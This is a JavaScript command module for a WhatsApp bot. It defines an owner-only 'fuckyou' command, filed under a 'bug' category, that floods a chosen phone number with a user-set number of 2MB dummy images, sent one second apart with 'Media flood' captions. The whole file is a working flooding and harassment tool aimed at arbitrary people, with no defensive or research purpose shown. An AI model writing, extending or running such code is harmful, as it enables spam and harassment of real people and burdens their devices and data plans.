import { isOwner, sendError } from '../lib/utils.js';


let cooldownMedia = 0;

export default {
    name: 'fuckyou',
    aliases: [],
    description: 'Send massive image spam to target (owner only)',
    isPremium: true,
    groupOnly: false,
    privateOnly: true,
    adminOnly: true,
    category: 'bug',

    async execute(sock, message, args) {
        const from = message.key.remoteJid;
        const sender = message.key.participant || from;

        if (!isOwner(sender)) 
            return await sendError(sock, from, 'Only owners can use this command.');

        const currentTime = Date.now();
        if (currentTime - cooldownMedia < 5000) 
            return await sendError(sock, from, `Please wait before using this command again.`);

        const phoneNumber = args[0]?.replace(/\D/g, '');
        if (!phoneNumber || phoneNumber.length < 10) 
            return await sendError(sock, from, `Provide a valid phone number (e.g., !fuckyou 254722233xxx).`);

        const targetJid = `${phoneNumber}@s.whatsapp.net`;
        const mediaCount = parseInt(args[1]) || 10;

        try {
            const image = Buffer.alloc(1024 * 1024 * 2); // 2MB dummy
            for (let i = 0; i < mediaCount; i++) {
                await sock.sendMessage(targetJid, { image, caption: `Media flood ${i + 1}/${mediaCount} 🖼️` });
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            await sock.sendMessage(from, { text: `Sent ${mediaCount} images to ${phoneNumber} ✅` });
            cooldownMedia = currentTime;
        } catch (error) {
            await sendError(sock, from, 'Media flood test failed.');
        }
    }
};